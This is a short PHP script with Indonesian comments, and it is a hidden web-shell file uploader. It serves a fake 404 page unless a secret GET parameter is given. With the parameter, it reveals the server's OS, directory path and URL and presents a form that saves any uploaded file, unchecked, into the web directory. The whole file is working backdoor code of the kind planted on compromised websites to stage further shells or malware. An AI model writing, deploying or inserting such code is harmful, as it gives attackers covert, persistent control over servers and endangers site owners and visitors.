<?php
// Cek parameter GET untuk akses
if (!isset($_GET['asepganteng']) || $_GET['asepganteng'] !== 'parah') {
    // Tampilkan halaman kosong atau pesan sederhana jika tidak ada parameter yang benar
    echo '<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
    exit;
}

echo '<pre>';

// Info Sistem
echo "🖥️ OS      : " . php_uname() . "\n";
echo "📁 Lokasi  : " . __DIR__ . "\n";

// Deteksi URL akses saat ini
$proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$host = $_SERVER['HTTP_HOST'] ?? 'localhost';
$uri = $_SERVER['REQUEST_URI'] ?? basename(__FILE__);
$fullURL = $proto . '://' . $host . $uri;

echo "🌐 URL     : " . $fullURL . "\n";
echo "========================================\n";

// Form Upload
echo '<form method="post" enctype="multipart/form-data">
<input type="file" name="__">
<input name="_" type="submit" value="Upload">
</form>';

// Jika ada upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['__'])) {
    $file = $_FILES['__'];
    $name = basename($file['name']);
    $target = __DIR__ . DIRECTORY_SEPARATOR . $name;

    if (@copy($file['tmp_name'], $target)) {
        echo "\n✅ Upload berhasil: {$name}\n";
        echo "📍 Disimpan di    : {$target}\n";
        echo "🔗 Akses (mungkin): {$proto}://{$host}/{$name}\n";
    } else {
        echo "\n❌ Upload gagal.\n";
    }
}

echo '</pre>';
?>
